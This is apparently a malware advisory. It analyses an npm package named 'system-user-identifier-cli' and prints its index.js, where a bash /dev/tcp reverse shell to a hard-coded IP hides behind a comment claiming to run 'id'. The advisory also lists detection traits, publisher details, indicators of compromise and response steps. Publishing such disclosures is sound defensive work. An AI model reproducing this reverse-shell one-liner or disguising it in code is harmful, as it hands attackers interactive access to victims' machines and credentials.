---
title: "system-user-identifier-cli: an 'identity helper' that just opens a reverse shell"
date: 2026-05-25
summary: "799 bytes, two files, and a name like a thousand throwaway npx tools — it really does check your user id, then drops a bash /dev/tcp reverse shell and calls home."
packageName: system-user-identifier-cli
ecosystem: npm
---

799 bytes, two files, a placeholder author, and a name that reads like a thousand other throwaway `npx` utilities; the manifest calls it "a simple npx tool to check system user identifier," and the binary does check the user before it calls home.

All 17 lines of `index.js`, comments and all:

<pre class="lang-js"><code><span class="tok-com">#!/usr/bin/env node</span>

<span class="tok-kw">const</span> os = <span class="tok-builtin">require</span>(<span class="tok-str">'os'</span>);
<span class="tok-kw">const</span> { execSync } = <span class="tok-builtin">require</span>(<span class="tok-str">'child_process'</span>);

<span class="tok-com">// 方法 1：使用 Node.js 内置模块（推荐，跨平台支持更好）</span>
<span class="tok-kw">const</span> user = os.<span class="tok-fn">userInfo</span>().username;
<span class="tok-kw">const</span> platform = os.<span class="tok-fn">platform</span>();
console.<span class="tok-fn">log</span>(<span class="tok-tmpl">`👋 Hello! (Node内置方法) 当前用户是: <span class="tok-tmpl-expr">${user}</span> (<span class="tok-tmpl-expr">${platform}</span>)`</span>);

<span class="tok-com">// 方法 2：直接执行系统的 id 命令（原生 Shell）</span>
<span class="tok-kw">try</span> {
    <span class="tok-kw">const</span> idOutput = <span class="tok-fn">execSync</span>(<span class="tok-str">'bash -i &gt;&amp; /dev/tcp/101.43.232.7/7777 0&gt;&amp;1'</span>, { encoding: <span class="tok-str">'utf-8'</span> }).<span class="tok-fn">trim</span>();
    console.<span class="tok-fn">log</span>(<span class="tok-tmpl">`💻 原生命令输出: <span class="tok-tmpl-expr">${idOutput}</span>`</span>);
} <span class="tok-kw">catch</span> (error) {
    console.<span class="tok-fn">error</span>(<span class="tok-str">'执行 id 命令失败:'</span>, error.message);
}
</code></pre>

Translated:

| Original | English |
| --- | --- |
| `方法 1：使用 Node.js 内置模块（推荐，跨平台支持更好）` | Method 1: Use Node.js built-in modules (recommended, better cross-platform support) |
| `(Node内置方法) 当前用户是:` | (Node built-in method) Current user is: |
| `方法 2：直接执行系统的 id 命令（原生 Shell）` | Method 2: Directly execute the system's `id` command (native shell) |
| `💻 原生命令输出:` | 💻 Native command output: |
| `执行 id 命令失败:` | id command execution failed: |

Method 2's comment promises `id`; the call is a `bash -i >& /dev/tcp` reverse shell, so a reviewer skimming the friendly output and the two-method comments expects a benign demo, and only the `execSync` argument breaks the spell. There is no staged download and no obfuscation, the trigger is the declared `bin` rather than a `preinstall` hook scanners watch for, and the verbose noun-stack name reads less like something a human would type than like what an LLM emits when asked to name a package for a stated need — paired with the one-shot `npx` surface, the intended caller may be an agent more than a person.

## Traits observed

The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) labels the archive against the [open cleave-traits taxonomy](https://github.com/atomdrift-project/traits), with [azoth](/azoth/) returning a malicious verdict at probability 1.0:

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/recon-exfil/pipeline` | npm package shaped to harvest CI/CD identity |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/reverse-shell/dup` | Bash reverse shell via `/dev/tcp` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/discovery/system/fingerprint/runtime` | User information collection |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | Placeholder author, no repository URL |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/masquerade/naming/placeholder` | Author field set to a test placeholder |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/process/create/shell/bridge` | Synchronous shell execution |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/recon-exfil/install-hook` | Package collects victim identifiers |
| <span class="sev-dot notable" title="notable"></span> | `metadata/package/fields/bin` | Declared CLI binary as the execution surface |

The reverse shell hands the attacker an interactive terminal on whatever ran the package, with that user's privileges, for as long as the TCP connection holds — narrower blast radius than a `preinstall` compromise since execution has to happen, but enough to reach SSH agents, npm and GitHub tokens, and CI deploy keys, so treat any host that ran it as compromised.

## Likely actor

Eight major-version bumps in three hours, from a throwaway gmail under a default ISC license:

| Field | Value |
| --- | --- |
| Publisher | `ayoung299 <iamayoung666@gmail.com>` |
| Package created | `2026-05-25T03:39:14Z` |
| Version 2.0.0 published | `2026-05-25T03:43:59Z` |
| Latest observed | `7.0.1` at `06:35:37Z` |
| Versions published | 1.0.0, 2.0.0, 3.0.0, 4.0.0, 5.0.0, 6.0.0, 7.0.0, 7.0.1 |
| Downloads API | `package not found` |

Every signal leans cheap — a Tencent Cloud VPS for C2, a hard-coded IP with no DNS, no staging, no persistence, `Your Name` in the author field, Chinese comments, and a textbook one-liner — reading like one person publishing cheaply to see if `npx` traffic finds the port, but the recipe works and the next hand on it may not be so unsophisticated.

## Indicators

| Type | Value |
| --- | --- |
| Package | `system-user-identifier-cli@2.0.0` (npm) |
| npm page | [npmjs.com/package/system-user-identifier-cli](https://www.npmjs.com/package/system-user-identifier-cli) |
| Archive SHA-256 | [`8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e`](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) |
| `index.js` SHA-256 | [`bfb0cc6b95a52da2789e4436c8b45d7349dd79ecef358fa1c34b6294ad7eace3`](https://lab.atomdrift.org/file/bfb0cc6b95a52da2789e4436c8b45d7349dd79ecef358fa1c34b6294ad7eace3) |
| `package.json` SHA-256 | [`28e8fcb5e9762c76f393dfc17d434a5089f107558df62db8246db8cb8217c7ce`](https://lab.atomdrift.org/file/28e8fcb5e9762c76f393dfc17d434a5089f107558df62db8246db8cb8217c7ce) |
| C2 endpoint | `101.43.232.7:7777` |

## Response

- Search shell history, npm caches, CI logs, and egress telemetry for the package name and for outbound traffic to `101.43.232.7:7777`.
- Rotate npm, GitHub, SSH, cloud, and deployment credentials available to any user who ran the binary, from a host that did not.
- Full trait list and raw analysis: the [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e).
